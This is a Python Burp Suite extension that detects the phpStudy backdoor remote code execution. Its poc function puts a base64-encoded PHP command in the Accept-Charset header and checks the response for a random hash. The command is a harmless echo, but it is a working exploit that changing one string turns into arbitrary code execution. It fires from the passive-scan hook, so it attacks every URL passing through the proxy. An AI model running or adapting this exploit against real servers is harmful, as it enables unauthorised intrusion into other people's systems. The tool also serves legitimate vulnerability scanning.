from burp import IBurpExtender
from burp import IScannerCheck
from burp import IScanIssue
from array import array
from java.net import URL
from urlparse import urlparse
import urllib2, base64, random
from hashlib import md5

def poc(url):
    host = urlparse(url).netloc
    command = base64.b64encode("echo '{0}';".format(hashstr))
    headers = {
        "Accept-Encoding": "gzip,deflate",
        "Accept-Charset": command,
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36"
    }
    r = urllib2.Request(url=url, headers=headers)
    uri = r.get_selector()
    result = urllib2.urlopen(r).read()
    if hashstr in result:
        return headers, host ,uri
    else:
        return False, False, False

def randmd5():
    new_md5 = md5()
    new_md5.update(str(random.randint(1,1000)))
    return new_md5.hexdigest()

hashstr = randmd5()

class BurpExtender(IBurpExtender, IScannerCheck):
    def registerExtenderCallbacks(self, callbacks):
        self._extensionName = "phpStudy Backdoor Remote Code Execution Scanner"
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName(self._extensionName)
        print("Author: Vulkey_Chen\nTeam: Mystery Security Team\nBlog: gh0st.cn")
        callbacks.registerScannerCheck(self)

    def doActiveScan(self, baseRequestResponse, insertionPoint):
        pass

    def doPassiveScan(self, baseRequestResponse):
        url = self._helpers.analyzeRequest(baseRequestResponse).getUrl()
        payloads, host, uri = poc(str(url))
        header = ""
        if payloads:
            for i in payloads:
                header += "<p>{0}: {1}</p>".format(i, payloads[i])
            return [CustomScanIssue(
                baseRequestResponse.getHttpService(),
                url,
                None,
                "phpStudy Backdoor Remote Code Execution Scanner",
                "<b>HTTP Request Raw:</b><p>GET {0} HTTP/1.1</p><p>Host: {1}</p>{2}<br><br><b>Response String:</b> {3}".format(uri, host, header, hashstr),
                "High")]

    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        if existingIssue.getIssueName() == newIssue.getIssueName():
            return -1
        return 0

class CustomScanIssue(IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, severity):
        self._httpService = httpService
        self._url = url
        self._httpMessages = httpMessages
        self._name = name
        self._detail = detail
        self._severity = severity

    def getUrl(self):
        return self._url

    def getIssueName(self):
        return self._name

    def getIssueType(self):
        return 0

    def getSeverity(self):
        return self._severity

    def getConfidence(self):
        return "Certain"

    def getIssueBackground(self):
        pass

    def getRemediationBackground(self):
        pass

    def getIssueDetail(self):
        return self._detail

    def getRemediationDetail(self):
        pass

    def getHttpMessages(self):
        return self._httpMessages

    def getHttpService(self):
        return self._httpService